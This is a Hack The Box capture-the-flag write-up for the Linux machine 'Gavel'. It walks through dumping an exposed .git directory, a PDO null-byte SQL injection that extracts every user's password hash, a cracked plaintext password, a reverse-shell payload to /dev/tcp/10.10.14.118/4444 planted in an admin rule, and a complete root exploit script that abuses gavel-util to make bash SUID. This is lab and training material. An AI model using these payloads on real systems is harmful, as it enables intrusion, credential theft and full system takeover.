---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
---
# Overview

| Name        | Gavel       |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo nmap -sC -sV -T4 10.10.11.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 17:01 +0545
Nmap scan report for gavel.htb (10.10.11.97)
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-git:
|   10.10.11.97:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: ..
|_http-title: Gavel Auction
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.68 seconds
```
# Enumeration

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/GitTools/Dumper]
└─$ ./gitdumper.sh http://gavel.htb/.git/ /home/at0m/GitTools/Dumper/gavel
```
# Initial Foothold
## SQLI

There is SQLI in `inventory.php`:

```php
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/GitTools/Dumper/gavel]
└─$ cat inventory.php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';

if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
foreach ($results as $row) {
    $firstKey = array_keys($row)[0];
    $name = $row['item_name'] ?? $row[$firstKey] ?? null;
    if (!$name) {
        continue;
    }
    $meta = [];
    try {
        $itemMeta->execute([$name]);
        $meta = $itemMeta->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $meta = [];
    }
    $itemMap[$name] = [
        'name' => $name ?? "",
        'description' => $meta['description'] ?? "",
        'image' => $meta['image'] ?? "",
        'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
    ];
}
$stmt = $pdo->prepare("SELECT money FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user']['id']]);
$money = $stmt->fetchColumn();
?>
```

```php
$col = "`" . str_replace("`", "", $sortItem) . "`";
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
```

But we need way to bypass:

```php
foreach ($results as $row) {
    $firstKey = array_keys($row)[0];
    $name = $row['item_name'] ?? $row[$firstKey] ?? null;
    if (!$name) {
        continue;
    }
    $meta = [];
    try {
        $itemMeta->execute([$name]);
        $meta = $itemMeta->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $meta = [];
    }
    $itemMap[$name] = [
        'name' => $name ?? "",
        'description' => $meta['description'] ?? "",
        'image' => $meta['image'] ?? "",
        'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
    ];
}
```

You can use [PayloadAllThings]([https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements "https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements")) or [this]([https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/ "https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/")) to get SQL injection in `pdo`:

First Register and get your session cookie.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/GitTools/Dumper/gavel]
└─$ curl -s 'http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+table_name+AS+`'"'"'x`+from+information_schema.tables)y;--&sort=\?;--%00' -b 'gavel_session=l65oobq5ec3k28bcma2pmqgbbg' | grep -o '<strong>[^<]*</strong>' | sed 's/<[^>]*>//g'
50,000
Sort by:
auctions
inventory
items
users
ADMINISTRABLE_ROLE_AUTHORIZATIONS
APPLICABLE_ROLES
CHARACTER_SETS
CHECK_CONSTRAINTS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMNS_EXTENSIONS
COLUMN_PRIVILEGES
COLUMN_STATISTICS
ENABLED_ROLES
ENGINES
EVENTS
FILES
INNODB_BUFFER_PAGE
INNODB_BUFFER_PAGE_LRU
INNODB_BUFFER_POOL_STATS
INNODB_CACHED_INDEXES
INNODB_CMP
INNODB_CMPMEM
INNODB_CMPMEM_RESET
INNODB_CMP_PER_INDEX
INNODB_CMP_PER_INDEX_RESET
INNODB_CMP_RESET
INNODB_COLUMNS
INNODB_DATAFILES
INNODB_FIELDS
INNODB_FOREIGN
INNODB_FOREIGN_COLS
INNODB_FT_BEING_DELETED
INNODB_FT_CONFIG
INNODB_FT_DEFAULT_STOPWORD
INNODB_FT_DELETED
INNODB_FT_INDEX_CACHE
INNODB_FT_INDEX_TABLE
INNODB_INDEXES
INNODB_METRICS
INNODB_SESSION_TEMP_TABLESPACES
INNODB_TABLES
INNODB_TABLESPACES
INNODB_TABLESPACES_BRIEF
INNODB_TABLESTATS
INNODB_TEMP_TABLE_INFO
INNODB_TRX
INNODB_VIRTUAL
KEYWORDS
KEY_COLUMN_USAGE
OPTIMIZER_TRACE
PARAMETERS
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
RESOURCE_GROUPS
ROLE_COLUMN_GRANTS
ROLE_ROUTINE_GRANTS
ROLE_TABLE_GRANTS
ROUTINES
SCHEMATA
SCHEMATA_EXTENSIONS
SCHEMA_PRIVILEGES
STATISTICS
ST_GEOMETRY_COLUMNS
ST_SPATIAL_REFERENCE_SYSTEMS
ST_UNITS_OF_MEASURE
TABLES
TABLESPACES
TABLESPACES_EXTENSIONS
TABLES_EXTENSIONS
TABLE_CONSTRAINTS
TABLE_CONSTRAINTS_EXTENSIONS
TABLE_PRIVILEGES
TRIGGERS
USER_ATTRIBUTES
USER_PRIVILEGES
VIEWS
VIEW_ROUTINE_USAGE
VIEW_TABLE_USAGE
global_status
global_variables
persisted_variables
processlist
session_account_connect_attrs
session_status
session_variables
variables_info
```

This payload:

```bash
curl -s 'http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+table_name+AS+`'"'"'x`+from+information_schema.tables)y;--&sort=\?;--%00'
```

```php
// inventory.php line 14
$col = "`" . str_replace("`", "", $sortItem) . "`";
// Line 24
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
```
### Normal PDO Behavior

When PDO prepares a statement with `prepare()`, it:

1. Parses the SQL to identify parameter placeholders (`?`)
2. When `execute()` is called, it binds values to those placeholders
3. With `PDO::ATTR_EMULATE_PREPARES` enabled (default), PDO does string escaping, not true prepared statements
### The Parser Bug

PDO's SQL parser has a flaw: it treats NULL bytes (`\x00`) as string terminators. This causes the parser to stop scanning prematurely.

See it like this:

```
GET /inventory.php?user_id=INJECTION1&sort=INJECTION2
```

```php
// Line 13: sort parameter processed FIRST
$sortItem = $_GET['sort']; // "\?;--%00"

// Line 14: Column name constructed
$col = "`" . str_replace("`", "", $sortItem) . "`"; // "`\?;--\x00`"

// Line 15: user_id parameter processed  
$userId = $_GET['user_id']; // "x` FROM (SELECT table_name..."

// Line 24: Query prepared with BOTH values
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ?");
// Becomes: SELECT `\?;--\x00` FROM inventory WHERE user_id = ?

// Line 25: Query executed
$stmt->execute([$userId]);
// Binds: "x` FROM (SELECT table_name..." to the FIRST ?
```

For getting the creds:

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/GitTools/Dumper/gavel]
└─$ curl -s 'http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`'"'"'x`+from+users)y;--&sort=\?;--%00' -b 'gavel_session=l65oobq5ec3k28bcma2pmqgbbg' | grep -o '<strong>[^<]*</strong>' | sed 's/<[^>]*>//g'
50,000
Sort by:
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
hacker:$2y$10$HBIVbSSg4p2rcTfYDyXiEuVLVLjCTZOKsHaL5PMLBpimXd3I5IODi
testuser123:$2y$10$NWT2zNWYwtQabtC3hJ1H6u/qy4P7PZqgm9HloNyxpJFWlda73xlU2
test:$2y$10$2PtRwVvutTjk0hmzgep0mORB98/YEksMUTKUe4ReTw9lXlbnboyey
mamamia:$2y$10$FAC3JEsJ.8EcMbhni9vnPeewdh1mux0jKAPDaOA/RPRx1lUYioobO
testauct1:$2y$10$ZNRIx7xwRRCMogwqbfkhO.42ySZiCRdOz3.IiyzzcZvAIi1cBsOt.
testauct2:$2y$10$S7X0ALVdJCgI6kreR7asfOqp4vTWJ6bC7VF9O1AopJ83qnG8naM8m
tester:$2y$10$KfgwBYqZD24yplgTsu8gc.tKyFFhCWSd625ZPE1YWFgUEN2Ppb3ZS
debuguser999:$2y$10$2WtJyVn7vw9suPHYnZCFU.EwfGQE.fgQgYpKv73TV4qTgYJGNo.GO
ElvenEarl77:$2y$10$iA.EdTEqaD5Em1ZQagjzSeOr9CHWZ6Gf8wC2YiVzowV0s9aFpWbQW
auctions:$2y$10$p4Nq5iAQw7ixRSWcsieiEusAkjacK3dZ6xTDo06JhnpIUd7hnbDZ.
texp99:$2y$10$l.ZF54zFdUJ9JyVmINnPKuZz4FAgbecXzr.7gVwTMD6lSd2YmsXK.
texp97:$2y$10$nr/Ebii9ZCVtw58xUZljb.7gwMrloosfwd7fcrROPbBrJ6khvajLS
texp96:$2y$10$7t/TRDB6jLDQ3PD1VyCfw.s0PTxzV.A6t98jloDItvERnJVV.mK2e
texp95:$2y$10$ZsCpNE./ic4/nt.gPvqN.OeuK8.tTK0QGe7nEAescxSp3N9zmuVta
admin:$2y$10$LAf9Uk3vxXVAFS3PfLG69OyEECdPZbO.vvwLIfyAZvfr17QCSdbMu
racexp1:$2y$10$c6.LsZ87qrxOnp2gd6PD9u/2yU2QYxqmKf9KY9L2rOoR3PRyYPrLS
sqliexp1:$2y$10$HnLxbBILY.ye6tlYOqVtJulc8yZwacfVQ9Fpr5PVG57zsJFV3atT.
jithin:$2y$10$juZoUroYuC5UyGUkuvId5OqBAm.HFTHDObFWPn9bu3aVIkYsQTGiS
yamlexp1:$2y$10$IYYBR5JyI72u.tQVQVgjKOi.ylXT4J689mSddTXfDQ5FRXXMnZFdC
filewrite1:$2y$10$0tsOLynL.KaPw/rEq09g1.N3LbJDVpnmqu3gzAHnvOs.GAEgw55h6
theorytest1:$2y$10$PnMUITFGP33qCyD9qgO1Yue2MSYTa1yeLJy1zSo.5t8x6/ewyFSeq
updatetest1:$2y$10$.nTM2lu6p9Cw71BGg4hgqOBaXQbctCKot4ghRbVBfED7of.RQUMme
adminn:$2y$10$cmfHuePAQUaxfv/FYdDA..4.kBEq1xHm7pWXIejq0pRW1bsOMKFaS
yamlwrite1:$2y$10$s6iBysgODWJPimNUTE9XheRN8rKsz59dM/3WcRIqmGnJxrR3GWbDO
errortest2:$2y$10$7m6hguvlEbEfQUx0BwNz/eEbui7Ned4ZF.b2PA3cpAfL/ThOuccXa
logtest1:$2y$10$JABrACUjdloWKBTF1XO8vOzQg3aZUleHbc3V45KeFe8hYTpCLeUlm
errortest3:$2y$10$b7/GsqGeQG5uRu7K2B20A.cbWmfHjeZeKVl9n4RHLmkMYXmEyTx6q
extract99:$2y$10$Qpv/NMOG3EYzpkXGWoseNegui/pkXgUGqKla58FVWta6ptX7JdQCC
normal99:$2y$10$KX4412Ytf7Q70C9hHiK6deC9./Hcmye5r.eHjDh.1hgZz2uZYufIO
diff1:$2y$10$kEPhSE5sYuE.4ykay8hCouPgpu5E76Hkro30PgRPYzctLLaxmn54m
diff2:$2y$10$nQy99zGXwRRV1QW4C1hOhu6rr4twm1QqkcrXuNYd1rMfH16squqyu
viewsrc1:$2y$10$g9UCNJ7sg4IICgKUUkGF8OQSGS42er4G152Q90yATw3IXX03VLGQO
filewrite99:$2y$10$T6AR9FMdMFOHv7/N3ite3O2b1X7YYyJa4Dye6Z4a9bQ/RzlT0DvEW
enumusers1:$2y$10$X7q9sUFVxGTDxomgT6HvYefMHmAxyVQS/ARbhke1tDStaUQ70guQ6
finaltest1:$2y$10$NTzi21obkdK68uPNCAF1ouA8Nqep8j6C6z7uJ5Bijv0Hghsc0Zxi.
Gavel:$2y$10$WZa/pGUkQPCj/Kf2Q.PA2uHGHVQLARLjE1KxN8IH0ob333lN.v4FS
administrator:$2y$10$x3UBcUrBBrJ7z.b27Zs3UOEQEeKgdgCof4TAQdsMs2xHPFkByG6o2
root:$2y$10$TDEdN6ceDhqonZH4h6pdd.vvznVdiVKU.lLKgC9.WMipj6N6HgPwy
Jijai:$2y$10$O4K7S4OZvajbHg20opCn7uJ5ymwWZy5EhLAcAoLDnSoe04HuGZEiO
tttt:$2y$10$RayctN98/UQiPTQ7JhjJSuQl2lI1OCIUo5Fwz9JQ2g4PCiqqZY2iq
at0m:$2y$10$OSEcLFCaod/9u8QeVQTsVuU7va5K4AJpUiDso7SL15ZlUHsopOvfu
aaa:$2y$10$waMOAsctq/5pk5r/SpQBs.Gqx1O27dXyIz4Zabtk4ZsbiNPTn8yY6
sqlifocus1:$2y$10$oTqi6dnKfcDZhoWXjIQIbOE9zn9E7YKbeHy2dTa4V.PsBqNlqBPvm
sqlikey1:$2y$10$RRUwJqWRNd3a28ZUNa1W7.u0qB2FQrTN6jE1tnQ1WFh9fjJnn4KPa
sqlisimple1:$2y$10$n/EK.Slu4YYjfLyzx7v7leqa2MCbJyxoAfnWo6FPCjAxpyHocYfmS
sqlbreak1:$2y$10$lHpuHo.xoNl9we1E/XTBrungmB4LakpmeAKFCRN2CBETVSnmCqNNq
sqlhex1:$2y$10$y/2e9uo3.Svx2gxf0MykkOjeGokBYo0jMb86cxI3EmGA2JZxtQ6d6
sqltest99:$2y$10$ru5QFfehUsvuj4ymhulxXOx.aO0PDC35dnyP0cLFNUVG7IK1s/ahy
sqlfinal99:$2y$10$CalQQUFUCargHwq3X4hHRurZPziAEBbKQ9/3C2j.N1UKUPDo/J43u
breakthrough1:$2y$10$AbWLgul1bfpHGwFHrnfSxObraryV.VP2EcZlAffj98R3qJJ8wazvS
coltest1:$2y$10$rpCrAa2ghNvlmzFMPzys/OBQdwT6vL4agZePPzgZUyOVEDM.GX3h.
exploit123:$2y$10$uFTktL3y8zauX5Qocn2RAuA3N0pk4HHL1t9OvbBftdEX5mJe.uPUG
functest1:$2y$10$60QMXejtb3C1sMyANSh9..JcwKwuXC2cGhodUiurVSOKInFw1uY3m
final_attempt:$2y$10$AXw55UuPhIw.wjXQSBSSNe1ahxCA6Ru/QBUUX6uUPYMEUpt8aWkg.
backticktest:$2y$10$EQsmnEifhcGLwWUhcOn1BO3wpoUKLoKcN2Yz9Nw5oJiHVXFKFKL5i
urltest1:$2y$10$nNLAls2aTwc1Z.qmrgCHHOStAqwWCJtXtpt65PTLMzh3bHF.HjRXO
breakthrough99:$2y$10$lueRlIQqog7BQIskhZn72uTKi.8NLQPF/CRlW8p/OSmIOF904b.vq
direct_test:$2y$10$zAC0dTa//gDTnOJIlxh88eCduNWtyN4LElhkhfeaicITg7tywU4qm
desperate1:$2y$10$UNX2sxncFo4VkQSiR57zK.YGKgQNWJg4IkyaxVyApAa0HtHg3rBSW
```

Crack hash of `auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS`

```bash
john --format=bcrypt shit.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Log in to the website with your new credentials (`auctioneer:midnight1`). Just go to admin panel and edit some rule using this:

```bash
system('bash -c "bash -i >& /dev/tcp/10.10.14.118/4444 0>&1"'); return true;
```

Start listener and go to bidding and bid on the item you edited. You should have shell:

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/GitTools/Dumper/gavel]
└─$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.118] from (UNKNOWN) [10.10.11.97] 45862
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gavel:/var/www/html/gavel/includes$
```

```bash
www-data@gavel:/var/www/html/gavel/includes$ cd /home
cd /home
www-data@gavel:/home$ ls
ls
auctioneer
www-data@gavel:/home$
```

We cant use SSH.

```bash
www-data@gavel:/home$ su auctioneer
su auctioneer
Password: midnight1

ls
auctioneer
whoami
auctioneer
```

```bash
cd auctioneer
ls
user.txt
cat user.txt
2d5261d832ded787b97d196a12821a56
```
# Root

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
auctioneer@gavel:/var/www/html/gavel/includes$ sudo -l
sudo -l
[sudo] password for auctioneer: midnight1

Sorry, user auctioneer may not run sudo on gavel.
auctioneer@gavel:/var/www/html/gavel/includes$ cd /opt
cd /opt
auctioneer@gavel:/opt$ ls
ls
gavel
auctioneer@gavel:/opt$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov  5 12:46 .
drwxr-xr-x 19 root root 4096 Nov  5 12:46 ..
drwxr-xr-x  4 root root 4096 Nov  5 12:46 gavel
```

```bash
auctioneer@gavel:/usr/local/bin$ ls -la
ls -la
total 28
drwxr-xr-x  2 root root          4096 Oct  3 19:35 .
drwxr-xr-x 10 root root          4096 Sep 11  2024 ..
-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util
```

```bash
auctioneer@gavel:/usr/local/bin$ ./gavel-util
./gavel-util
Usage: ./gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

1. **Creates malicious YAML files** containing PHP code
2. **Submits them to `gavel-util`** (a program with high privileges)
3. **First payload**: Removes PHP security restrictions (`disable_functions` and `open_basedir`)
4. **Second payload**: Makes `/bin/bash` **SUID root** (so anyone running bash becomes root)
5. **If successful**: Spawns a root shell and reads the root flag (`/root/root.txt`)

- `gavel-util` processes YAML files without sanitization
- It executes PHP code from the `rule` field
- This allows **arbitrary code execution** as a privileged user

```bash
#!/bin/bash
echo "[*] Screw Gavel Root Exploit"
echo "[*] Stand-by..."
WORKDIR="/tmp/pwn_$(date +%s)"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[*] Step 1: Overwriting php.ini to remove disable_functions and open_basedir..."
cat << 'EOF_INI' > ini_overwrite.yaml
name: IniOverwrite
description: Removing restrictions
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Config Pwned"
rule: |
  file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=/\ndisable_functions=\n");
  return false;
EOF_INI
/usr/local/bin/gavel-util submit ini_overwrite.yaml
echo "[*] Config overwrite submitted. Waiting 5 seconds for stability..."
sleep 5

echo "[*] Step 2: Triggering system() to SUID /bin/bash..."
cat << 'EOF_SUID' > root_suid.yaml
name: RootSuid
description: Getting Root
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Shell Pwned"
rule: |
  system("chmod u+s /bin/bash");
  return false;
EOF_SUID
/usr/local/bin/gavel-util submit root_suid.yaml

echo "[*] Payload submitted. Checking /bin/bash permissions..."
sleep 2

if ls -la /bin/bash | grep -q "rws"; then
    echo "[+] SUCCESS! /bin/bash is now SUID root."
    echo "[*] Spawning root shell and reading /root/root.txt ..."
    /bin/bash -p -c 'cat /root/root.txt; exec /bin/bash -p'
else
    echo "[-] Exploit failed. /bin/bash is not SUID."
    echo "[*] Trying alternative payload (copy bash)..."

    cat << 'EOF_COPY' > root_copy.yaml
name: RootCopy
description: Getting Root Alt
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Shell Pwned Alt"
rule: |
  copy('/bin/bash', '/tmp/rootbash');
  chmod('/tmp/rootbash', 04755);
  return false;
EOF_COPY
    /usr/local/bin/gavel-util submit root_copy.yaml
    sleep 2

    if [ -f /tmp/rootbash ]; then
        echo "[+] Alternative payload SUCCESS! /tmp/rootbash created."
        echo "[*] Spawning root shell and reading /root/root.txt ..."
        /tmp/rootbash -p -c 'cat /root/root.txt; exec /tmp/rootbash -p'
    else
        echo "[-] All attempts failed."
        exit 1
    fi
fi
```

---